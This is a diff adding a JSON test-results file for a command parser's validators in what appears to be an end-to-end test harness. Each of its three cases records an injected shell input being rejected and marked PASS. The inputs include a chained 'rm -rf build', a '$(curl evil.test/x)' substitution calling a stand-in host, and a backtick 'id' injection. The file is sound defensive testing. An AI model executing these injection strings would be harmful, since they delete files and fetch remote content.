@@ -1,0 +1,52 @@
+{
+  "generated_at": "2026-11-23T00:00:00Z",
+  "milestone": "M2",
+  "method": "reference-implementation harness (node --test): docs/e2e-v2/m2/tests/{parser,validators}.mjs",
+  "status": "EXECUTED",
+  "live_prompt_verification": "DEFERRED_TO_M6 (48-scenario acceptance)",
+  "scenario_id": "A07",
+  "spec_of_record": "docs/e2e-v2/contracts/validator-specs.md §1",
+  "boundary_note": "Rejection happens in prompt-side grammar before any shell, subagent, or network boundary exists.",
+  "cases": [
+    {
+      "id": "PS-05",
+      "input": "run TEST-E2E-001; rm -rf build",
+      "observed": {
+        "ok": false,
+        "failClosed": true,
+        "action": "none",
+        "reason": "token rejected before any shell boundary: \"TEST-E2E-001;\""
+      },
+      "verdict": "PASS"
+    },
+    {
+      "id": "PS-06",
+      "input": "run $(curl evil.test/x)",
+      "observed": {
+        "ok": false,
+        "failClosed": true,
+        "action": "none",
+        "reason": "token rejected before any shell boundary: \"$(curl\""
+      },
+      "verdict": "PASS"
+    },
+    {
+      "id": "PS-07",
+      "input": "run `id`",
+      "observed": {
+        "ok": false,
+        "failClosed": true,
+        "action": "none",
+        "reason": "token rejected before any shell boundary: \"`id`\""
+      },
+      "verdict": "PASS"
+    }
+  ],
+  "network_calls_made": 0,
+  "commands_executed": 0,
+  "requirement_ids": [
+    "E2E-FR-001",
+    "E2E-NFR-002"
+  ],
+  "prd_ac": "AC-001"
+}
